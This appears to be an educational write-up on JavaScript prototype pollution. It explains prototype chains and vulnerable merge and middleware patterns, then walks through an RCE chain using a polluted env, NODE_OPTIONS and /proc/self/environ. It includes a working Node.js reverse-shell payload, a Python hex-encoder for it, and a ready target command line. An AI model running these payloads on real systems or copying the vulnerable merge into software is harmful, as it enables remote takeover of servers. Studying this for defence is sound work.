# Polluting Prototypes

## What is Prototype?

JavaScript objects are dynamic _**bags**_ of properties (referred to as _**own properties**_). JavaScript objects have a link to a prototype object. When trying to access a property of an object, the property will not only be sought on the object but on the prototype of the object, the prototype of the prototype, and so on until either a property with a matching name is found or the end of the prototype chain is reached.

There are several ways to specify the prototype of an object. For now, we will use the [\_\_proto__ syntax](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Object_initializer#prototype_setter) for illustration. It's worth noting that the ```{ __proto__: ... }``` syntax is different from the ```obj.__proto__``` accessor: the former is standard and not deprecated. In an object literal like ```{ a: 1, b: 2, __proto__: c }```, the value ```c``` (which has to be either ```null``` or another object) will become the prototype of the object represented by the literal, while the other keys like ```a``` and ```b``` will become the _**own properties**_ of the object. This syntax reads very naturally, since ```[[Prototype]]``` is just an "internal property" of the object.

## How prototype chains are resolved
```javascript
const o = {
  a: 1,
  b: 2,
  // __proto__ sets the [[Prototype]]. It's specified here
  // as another object literal.
  __proto__: {
    b: 3,
    c: 4,
  },
};

// o.[[Prototype]] has properties b and c.
// o.[[Prototype]].[[Prototype]] is Object.prototype (we will explain
// what that means later).
// Finally, o.[[Prototype]].[[Prototype]].[[Prototype]] is null.
// This is the end of the prototype chain, as null,
// by definition, has no [[Prototype]].
// Thus, the full prototype chain looks like:
// { a: 1, b: 2 } ---> { b: 3, c: 4 } ---> Object.prototype ---> null

console.log(o.a); // 1
// Is there an 'a' own property on o? Yes, and its value is 1.

console.log(o.b); // 2
// Is there a 'b' own property on o? Yes, and its value is 2.
// The prototype also has a 'b' property, but it's not visited.
// This is called Property Shadowing

console.log(o.c); // 4
// Is there a 'c' own property on o? No, check its prototype.
// Is there a 'c' own property on o.[[Prototype]]? Yes, its value is 4.

console.log(o.d); // undefined
// Is there a 'd' own property on o? No, check its prototype.
// Is there a 'd' own property on o.[[Prototype]]? No, check its prototype.
// o.[[Prototype]].[[Prototype]] is Object.prototype and
// there is no 'd' property by default, check its prototype.
// o.[[Prototype]].[[Prototype]].[[Prototype]] is null, stop searching,
// no property found, return undefined.
```

Setting a property to an object creates an own property. The only exception to the getting and setting behavior rules is when it's intercepted by a [getter or setter](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Working_with_Objects#defining_getters_and_setters).

Similarly, you can create longer prototype chains, and a property will be sought on all of them.

```javascript
const o = {
  a: 1,
  b: 2,
  // __proto__ sets the [[Prototype]]. It's specified here
  // as another object literal.
  __proto__: {
    b: 3,
    c: 4,
    __proto__: {
      d: 5,
    },
  },
};

// { a: 1, b: 2 } ---> { b: 3, c: 4 } ---> { d: 5 } ---> Object.prototype ---> null

console.log(o.d); // 5
```

## Vulnerability Signatures
### Objects without critical _**Own Property**_

JavaScript runtimes look for critical properties higher up in the chain of prototype inheritence hierarchy, only if an object does not have an _**Own Property**_ with the same key. It is highly recommended while writing JavaScript code to set critical _**Own Properties**_ at all times.

In the following example, the ```isAdmin``` property isn't set when certain conditions are not met (in the badly written middleware). This opens up a door for exploiting a successful prototype pollution. If the object prototype is somehow polluted to set the ```isAdmin``` as ```true```, an adversary could successfully access the critical endpoint with admin privileges. Compare that to the well-written middleware, which explicitly sets the property as false when check fails. In that case, even if the prototype is polluted, the _**Own Property**_ of the object is going to be considered during the critical endpoint access.

#### Example of objects without critical _**Own Properties**_
```javascript
// BADLY WRITTEN MIDDLEWARE
app.use((req, res, next) => {
	if (!req.headers.authorization)
		throw new Error('No JWT token found!')
	if (!JwtUtil.verify(req.headers.authorization))
		throw new Error('Invalid JWT token!')

	const parsedJWT = JwtUtil.parse(req.headers.authorization)
	const { hasAdminRole } = parsedJWT.permissions

	if (hasAdminRole && satisfyPrivilegeCriteria(req)) {
		req.isAdmin = true
	}
	next()
});

// WELL WRITTEN MIDDLEWARE
app.use((req, res, next) => {
	if (!req.headers.authorization)
		throw new Error('No JWT token found!')
	if (!JwtUtil.verify(req.headers.authorization))
		throw new Error('Invalid JWT token!')

	const parsedJWT = JwtUtil.parse(req.headers.authorization)
	const { hasAdminRole } = parsedJWT.permissions

	// Sets the isAdmin 'Own Property' in both true and false cases
	req.isAdmin = hasAdminRole && satisfyPrivilegeCriteria(req)
	next()
});

app.route('/critical', (req, res) => {
	if (req.isAdmin) {
		// Do some privileged stuff
	}
})
```

### Insecure merge / copy of objects or setting properties insecurely

Prototype pollution occurs most of times in places where insecure merging of two objects or copying takes place. The other examples where prototype pollution can occur are libraries which set properties on an object with random keys, not checking whether it's manipulating the prototype or not.

An example piece of code that is vulnerable to prototype pollution is shown below:

```javascript
function isObject(obj) {
    console.log(typeof obj);
    return typeof obj === 'function' || typeof obj === 'object';
}

// Function vulnerable to prototype pollution
function merge(target, source) {
    for (let key in source) {
        if (isObject(target[key]) && isObject(source[key])) {
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

function clone(target) {
    return merge({}, target);
}

// Run prototype pollution with user input
clone(USERINPUT);
```

## Exploitation Techniques Using Prototype Pollution
### Injecting Environment Variables

Consider a JavaScript code as follows:
```javascript
const { spawn } = require('child_process');
const ls = spawn('ls', ['-lh', '/usr']);

ls.stdout.on('data', (data) => {
  console.log(`stdout: ${data}`);
});

ls.stderr.on('data', (data) => {
  console.error(`stderr: ${data}`);
});

ls.on('close', (code) => {
  console.log(`child process exited with code ${code}`);
});
```

The above program is very simple to understand. It simply spawns a new process with the given command (```ls -lh /usr```) in this case and dumps the output of the child process into the console of the parent process. When executed, the output, as expected, will be a list of the content of the ```/usr``` directory.

From the [official documentation](https://nodejs.org/api/child_process.html#child_processspawncommand-args-options), there is a way to pass environment variables to the child process. To verify that the environment variables are indeed being passed into the child process, we will fork a new process with the ```printenv``` command, which will list down all environment variables available from the child process into the parent process's console. So the next code looks like as follows:
```javascript
const { spawn } = require('child_process');
const ls = spawn('printenv', [], { env: { ENVAR: 'testValue-foo' } });

ls.stdout.on('data', (data) => {
  console.log(`stdout: ${data}`);
});

ls.stderr.on('data', (data) => {
  console.error(`stderr: ${data}`);
});

ls.on('close', (code) => {
  console.log(`child process exited with code ${code}`);
});

//////// OUTPUT ////////
// stdout: ENVAR=testValue-foo
// child process exited with code 0
```
The signature of the spawn function is ```child_process.spawn(command[, args][, options])```. This is interesting because if we simply call ```spawn``` without any ```options``` argument set, the ```env``` attribute in ```options``` object isn't available to the runtime by default. Which means if we can pollute the object's prototype object by setting an ```env``` attribute in it, the polluted environment variables will be passed down to the forked process inside ```child_process``` module.

The following JS code, when executed, confirms that the polluted environment variable object (```env```) is passed into the forked child process as environment variables. This can also be confirmed from the ```child_process``` module's [source code](https://github.com/nodejs/node/blob/main/lib/child_process.js#L650).

```javascript
// Pollute prototype with env
let object = {};
object.__proto__.env = { ENVAR: 'testValue-foo' };

const { spawn } = require('child_process');
const ls = spawn('printenv');

ls.stdout.on('data', (data) => {
  console.log(`stdout: ${data}`);
});

ls.stderr.on('data', (data) => {
  console.error(`stderr: ${data}`);
});

ls.on('close', (code) => {
  console.log(`child process exited with code ${code}`);
});

//////// OUTPUT ////////
// stdout: ENVAR=testValue-foo
// env=[object Object]
// child process exited with code 0
```

### RCE from Injected Environment Variables

In the above section, we managed to inject environment variables into a child process through prototype pollution. Now we're going to look at how to execute arbitrary commands leveraging the previous technique.

Before we begin, here's a fundamental fact about Linux. For any process executing in Linux, its environment variables are stored in the ```/proc/${PID}/environ``` file where ```${PID}``` is the process ID of that process. Any process can read its own environment variables by reading the ```/proc/self/environ``` file. Here, ```self``` indicates the currently executing process and is inferred by the kernel.

#### Reading ```/proc/self/environ```
```javascript
root@96901c2d0cb1:~# cat /proc/self/environ
HOSTNAME=96901c2d0cb1PWD=/rootHOME=/rootLS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:TERM=xtermSHLVL=1PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binOLDPWD=/_=/usr/bin/cat
```

#### A couple of important facts before we proceed
> In Node.js, the ```NODE_OPTIONS``` environment variable is used to specify command line arguments to the ```node``` program. For example, the command ```$> node --require foo.js``` is equivalent to ```$> NODE_OPTIONS='--require foo.js' node```.

>The ```--require``` argument is used by ```node``` to include a JavaScript file and execute it at the very beginning before starting the REPL shell. Remember, ```--eval``` argument isn't allowed inside ```NODE_OPTIONS``` so we cannot achieve a direct code execution by doing that.

Given the above two facts, what happens if we do ```--require /proc/self/environ```? Obviously, the content of ```/proc/self/environ``` isn't a valid JavaScript code. Therefore, the Node.js runtime would show an error during startup before displaying the REPL console. However, it we inject another environment variable (say ```RANDOM```) before ```NODE_OPTIONS``` with the value ```console.log(123)//```, the final content of ```/proc/self/environ``` becomes
```javascript
RANDOM=console.log(123)//NODE_OPTIONS=–require /proc/self/environUSER=foo...
```
Now, this is a valid JavaScript as anything after the double slash is considered as a comment by the runtime. Therefore, we should be able to see the executed JavaScript code and its output (```123```) in the Node.js console before REPL console starts.

#### Executing JavaScript through environment variables
```bash
$> RANDOM='console.log(123)//' cat /proc/self/environ
RANDOM=console.log(123)//HOSTNAME=96901c2d0cb1PWD=/rootHOME=/rootLS_COLORS=rs=0:di=01...

$> RANDOM='console.log(123)//' cat /proc/self/environ | xargs node --eval
123

$> RANDOM='console.log(123)//' NODE_OPTIONS='--require /proc/self/environ' node
123
Welcome to Node.js v12.22.9.
Type ".help" for more information.
> .exit
```

Since we can execute arbitrary JavaScript code by injecting environment variables, let's write a JavaScript code exploit that gives us a reverse shell through Netcat. For doing this, we can start by making Netcat, in a publicly available server, listen to some port (say ```4444```) through the ```nc -lvp 4444``` command. Then we need to write a JavaScript code that acts as a Netcat client and gives us a complete reverse shell. The following code is a good exploit candidate:

#### JavaScript Netcat Client Exploit
```javascript
// Replace {{HOST}} and {{PORT}} with your netcat host and port details
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/bash", []);
    var client = new net.Socket();
    client.connect({{PORT}}, "{{HOST}}", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

We can replace the ```HOST``` and ```PORT``` details in the above code and encode the entire exploit into hexadecimal format. Doing so, would allow us to easily deliver the exploit to the remote target.

The following **Python** code takes care of replacing those details, taken through command line arguments, encode the exploit payload into hexadecimal format and output the value that needs to be placed in the first environment variable to execute the exploit on remote target.

```python
import sys

host = sys.argv[1]
port = sys.argv[2]

payload = '''(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/bash", []);
    var client = new net.Socket();
    client.connect({{PORT}}, "{{HOST}}", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
'''

payload = payload.replace('{{PORT}}', str(port)).replace('{{HOST}}', str(host))
payload = payload.encode('utf-8').hex()
final_env = 'eval(new Buffer("{{PAYLOAD}}", "hex").toString());//'.replace('{{PAYLOAD}}', payload)

print('PAYLOAD:\n', final_env)
```

The following section shows how we can use the above **Python** exploit generator to generate exploit and use it as a value in the first environment variable.

```bash
### GENERATE EXPLOIT ###
$[PUBLIC_NETCAT_SERVER]> python3 payload_maker.py ${PUBLIC_NETCAT_SERVER_HOSTNAME} ${PUBLIC_NETCAT_SERVER_PORT}
PAYLOAD:
 eval(new Buffer("2866756e6374696f6e28297b0a20202020766172206e6574203d207265717569726528226e657422292c0a20202020202020206370203d207265717569726528226368696c645f70726f6365737322292c0a20202020202020207368203d2063702e737061776e28222f62696e2f62617368222c205b5d293b0a2020202076617220636c69656e74203d206e6577206e65742e536f636b657428293b0a20202020636c69656e742e636f6e6e65637428313737332c20223139322e3136382e31302e3130222c2066756e6374696f6e28297b0a2020202020202020636c69656e742e706970652873682e737464696e293b0a202020202020202073682e7374646f75742e7069706528636c69656e74293b0a202020202020202073682e7374646572722e7069706528636c69656e74293b0a202020207d293b0a2020202072657475726e202f612f3b202f2f2050726576656e747320746865204e6f64652e6a73206170706c69636174696f6e20666f726d206372617368696e670a7d2928293b0a", "hex").toString());//

### START NETCAT SERVER ###
$[PUBLIC_NETCAT_SERVER]> nc -lvp 1773

### ON THE REMOTE TARGET, EXECUTE THE FOLLOWING ###
$[REMOTE_TARGET]> RANDOM='eval(new Buffer("2866756e6374696f6e28297b0a20202020766172206e6574203d207265717569726528226e657422292c0a20202020202020206370203d207265717569726528226368696c645f70726f6365737322292c0a20202020202020207368203d2063702e737061776e28222f62696e2f62617368222c205b5d293b0a2020202076617220636c69656e74203d206e6577206e65742e536f636b657428293b0a20202020636c69656e742e636f6e6e65637428313737332c20223139322e3136382e31302e3130222c2066756e6374696f6e28297b0a2020202020202020636c69656e742e706970652873682e737464696e293b0a202020202020202073682e7374646f75742e7069706528636c69656e74293b0a202020202020202073682e7374646572722e7069706528636c69656e74293b0a202020207d293b0a2020202072657475726e202f612f3b202f2f2050726576656e747320746865204e6f64652e6a73206170706c69636174696f6e20666f726d206372617368696e670a7d2928293b0a", "hex").toString());//' NODE_OPTIONS='--require /proc/self/environ' node
```

If the above steps are executed in a correct environment, a reverse shell should open up on your Netcat server.

Now that we've achieved a complete reverse shell, let's put together a complete and meaningful program that is exploitable. Before we do that, we have to understand a basic difference between ```spawn``` and ```fork``` functions in ```child_process``` module.

The ```spawn``` command is a command designed to run any arbitrary shell instructions. When you run ```spawn```, you send it a shell command or instruction that will be run as its own process, but does not execute any further code within your parent ```node``` process. You can add listeners for the process you have spawned, to allow your code interact with the spawned process, but no new V8 instance is created (unless of course if your command is creating another ```node``` process, but in this case you should use ```fork```!) and only one instance of V8 runtime will be running on the processor.

The ```fork``` command is a special case of ```spawn```, that runs a fresh instance of the V8 runtime engine. Meaning, you create multiple other V8 worker processes from the original V8 parent process. This is most useful for creating a worker pool. While Node.js' ```async``` event model allows a single core of a machine to be used fairly efficiently, it doesn't allow a node process to make use of multiple cores of a processor. Easiest way to accomplish this is to run multiple copies of the same program, on a single multi-core processor.

Therefore, we should technically be able to inject the two environment variables for achieving RCE through prototype pollution as explained above. And if there a fork call anywhere in the codebase, which is triggerable, that code injected through the environment variable will be executed on the remote server.

To confirm the same, see the following code:
```javascript
// Pollute prototype with env
let object = {}
object.__proto__.env = { RANDOM: 'console.log(123)//', NODE_OPTIONS: '--require /proc/self/environ' };

const { fork } = require('child_process');

if (process.argv[2] == 'child') {
    console.log('Hello from child!')
} else {
    fork(__filename, [ 'child' ]);
}

//////// OUTPUT ////////
// $> node fork_proto_env.js 
// 123
// Hello from child!
```

## Bibliography

- [Research on CVE-2019-7609 in Kibana Timelion](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
- [The child process API](https://nodejs.org/api/child_process.html)
- [Inheritance and prototype chain](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Inheritance_and_the_prototype_chain)

- Relevant links for good read:
  - https://www.vaadata.com/blog/node-js-common-vulnerabilities-security-best-practices/
  - https://portswigger.net/daily-swig/node-js-fixes-multiple-bugs-that-could-lead-to-rce-http-request-smuggling
